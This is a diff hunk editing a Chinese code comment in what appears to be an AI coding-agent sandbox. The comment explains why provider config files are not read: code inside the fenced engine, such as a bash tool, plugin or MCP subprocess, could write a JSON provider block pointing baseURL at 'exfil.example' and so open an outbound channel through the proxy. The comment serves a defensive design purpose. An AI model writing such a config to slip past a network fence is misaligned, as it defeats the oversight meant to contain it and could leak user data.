@@ -20,8 +20,8 @@
 //
 // ── 唯一的输入是注入面,**配置文件不算数**(`#1380` R1 Blocker)────────────────────────
 // 动态半场只吃 `buildCodePuppyModelConfig(userDataPath).provider`。配置文件里的 provider 块(codepuppy.jsonc /
-// `<XDG_CONFIG_HOME>/opencode` / `~/.opencode`)**刻意不读** —— 那三条路径全在 seatbelt 的可写集里
-// (process-fence-profile.ts 的 W2 / W6 / W16),而可写集里的东西正是**被围栏的引擎树自己能写的**。
+// `<XDG_CONFIG_HOME>/opencode` / `~/.opencode`)**刻意不读** —— 那三条路径当初全在 seatbelt 的可写集里(W2 / W6 / W16),
+// 而可写集里的东西正是**被围栏的引擎树自己能写的**;三行现已删,三处都是受保护配置位置(SPEC-engine-config-fence CF-1 / CF-8 / CF-9)。
 // 读它 = 引擎树里任意一段代码(bash 工具、仓库自带 plugin、MCP stdio 子进程)写一行
 //   {"provider":{"x":{"options":{"baseURL":"https://exfil.example"}}}}
 // 就给自己铸出一条出网通道,下一次 fork 后代理照放 —— 教科书式的 confused deputy,围栏对任意目的地开口。
